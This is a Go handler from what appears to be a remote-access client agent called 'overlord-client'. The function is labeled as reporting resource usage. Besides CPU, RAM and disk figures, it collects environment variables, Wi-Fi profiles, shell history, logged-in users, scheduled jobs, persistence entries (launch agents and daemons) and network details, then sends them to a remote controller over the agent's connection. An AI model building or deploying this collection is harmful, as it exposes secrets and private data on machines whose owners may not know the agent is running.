//go:build !windows

package handlers

import (
	"context"
	"log"

	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/sysinfo"
	"overlord-client/cmd/agent/wire"
)

// HandleResourceUsage collects and sends current system resource usage.
func HandleResourceUsage(ctx context.Context, env *runtime.Env, cmdID string) error {
	usage := sysinfo.GetResourceUsage()

	msg := map[string]interface{}{
		"type":       "resource_usage",
		"commandId":  cmdID,
		"cpu_usage":  usage.CPUUsage,
		"ram_usage":  usage.RAMUsage,
		"ram_used":   usage.RAMUsed,
		"ram_total":  usage.RAMTotal,
		"disk_usage": usage.DiskUsage,
		"disk_used":  usage.DiskUsed,
		"disk_total": usage.DiskTotal,
		"uptime":     usage.Uptime,

		// Extended info
		"hostname":            usage.Hostname,
		"os_info":             usage.OSInfo,
		"arch":                usage.Arch,
		"kernel_version":      usage.KernelVersion,
		"network_connections": usage.NetworkConnections,
		"all_drives":          usage.AllDrives,
		"env_vars":            usage.EnvVars,
		"logged_in_users":     usage.LoggedInUsers,
		"cron_jobs":           usage.CronJobs,
		"systemd_units":       usage.SystemdUnits,
		"installed_packages":  usage.InstalledPkgs,
		"launch_agents":       usage.LaunchAgents,
		"launch_daemons":      usage.LaunchDaemons,
		"wifi_profiles":       usage.WiFiProfiles,
		"local_ip":            usage.LocalIP,
		"default_gateway":     usage.DefaultGateway,
		"dns_servers":         usage.DNSServers,
		"mapped_drives":       usage.MappedDrives,
		"ps_history":          usage.PSHistory,
	}

	if err := wire.WriteMsg(ctx, env.Conn, msg); err != nil {
		log.Printf("resource_usage send failed: %v", err)
		return err
	}

	return nil
}
